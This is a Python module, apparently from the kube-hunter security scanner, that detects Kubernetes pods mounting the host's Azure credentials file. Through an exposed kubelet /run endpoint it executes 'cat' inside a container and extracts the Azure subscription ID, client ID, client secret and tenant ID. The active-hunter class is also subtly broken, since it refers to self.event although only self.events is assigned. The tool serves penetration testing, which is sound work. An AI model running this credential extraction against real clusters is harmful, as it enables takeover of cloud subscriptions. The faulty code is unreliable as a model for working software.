import os
import json
import logging
import requests

from kube_hunter.conf import get_config
from kube_hunter.modules.hunting.kubelet import ExposedPodsHandler, ExposedRunHandler
from kube_hunter.core.events.event_handler import handler
from kube_hunter.core.events.types import Event, Vulnerability
from kube_hunter.core.types import Hunter, ActiveHunter, MountServicePrincipalTechnique, Azure

from kube_hunter.modules.discovery.cloud.azure import AzureMetadataApiExposed

logger = logging.getLogger(__name__)


class AzureSpnExposure(Vulnerability, Event):
    """The SPN is exposed, potentially allowing an attacker to gain access to the Azure subscription"""

    def __init__(self, container, evidence=""):
        Vulnerability.__init__(
            self,
            Azure,
            "Azure SPN Exposure",
            category=MountServicePrincipalTechnique,
            vid="KHV004",
        )
        self.container = container
        self.evidence = evidence


@handler.subscribe_many([ExposedPodsHandler, AzureMetadataApiExposed])
class AzureSpnHunter(Hunter):
    """AKS Hunting
    Hunting Azure cluster deployments using specific known configurations
    """

    def __init__(self, event):
        self.event = event.get_by_class(ExposedPodsHandler)
        self.base_url = f"https://{self.event.host}:{self.event.port}"

    # getting a container that has access to the azure.json file
    def get_key_container(self):
        logger.debug("Trying to find container with access to azure.json file")

        # pods are saved in the previous event object
        pods_data = self.event.pods

        suspicious_volume_names = []
        for pod_data in pods_data:
            for volume in pod_data["spec"].get("volumes", []):
                if volume.get("hostPath"):
                    path = volume["hostPath"]["path"]
                    if "/etc/kubernetes/azure.json".startswith(path):
                        suspicious_volume_names.append(volume["name"])
            for container in pod_data["spec"]["containers"]:
                for mount in container.get("volumeMounts", []):
                    if mount["name"] in suspicious_volume_names:
                        return {
                            "name": container["name"],
                            "pod": pod_data["metadata"]["name"],
                            "namespace": pod_data["metadata"]["namespace"],
                            "mount": mount,
                        }

    def execute(self):
        container = self.get_key_container()
        if container:
            evidence = f"pod: {container['pod']}, namespace: {container['namespace']}"
            self.publish_event(AzureSpnExposure(container=container, evidence=evidence))


@handler.subscribe_many([AzureSpnExposure, ExposedRunHandler])
class ProveAzureSpnExposure(ActiveHunter):
    """Azure SPN Hunter
    Gets the azure subscription file on the host by executing inside a container
    """

    def __init__(self, events):
        self.events = events
        self.exposed_run_event = self.events.get_by_class(ExposedRunHandler)
        self.spn_exposure_event = self.events.get_by_class(AzureSpnExposure)

        self.base_url = f"https://{self.event.host}:{self.event.port}"

    def run(self, command, container):
        config = get_config()
        run_url = f"{self.base_url}/run/{container['namespace']}/{container['pod']}/{container['name']}"
        return self.exposed_run_event.session.post(
            run_url, verify=False, params={"cmd": command}, timeout=config.network_timeout
        )

    def get_full_path_to_azure_file(self):
        """
        Returns a full path to /etc/kubernetes/azure.json
        Taking into consideration the difference folder of the mount inside the container.
        TODO: implement the edge case where the mount is to parent /etc folder.
        """
        azure_file_path = self.event.container["mount"]["mountPath"]

        # taking care of cases where a subPath is added to map the specific file
        if not azure_file_path.endswith("azure.json"):
            azure_file_path = os.path.join(azure_file_path, "azure.json")

        return azure_file_path

    def execute(self):
        try:
            azure_file_path = self.get_full_path_to_azure_file()
            logger.debug(f"trying to access the azure.json at the resolved path: {azure_file_path}")
            subscription = self.run(f"cat {azure_file_path}", container=self.event.container).json()
        except requests.Timeout:
            logger.debug("failed to run command in container", exc_info=True)
        except json.decoder.JSONDecodeError:
            logger.warning("failed to parse SPN")
        else:
            if "subscriptionId" in subscription:
                self.spn_exposure_event.subscriptionId = subscription["subscriptionId"]
                self.spn_exposure_event.aadClientId = subscription["aadClientId"]
                self.spn_exposure_event.aadClientSecret = subscription["aadClientSecret"]
                self.spn_exposure_event.tenantId = subscription["tenantId"]
                self.spn_exposure_event.evidence = f"subscription: {self.event.subscriptionId}"
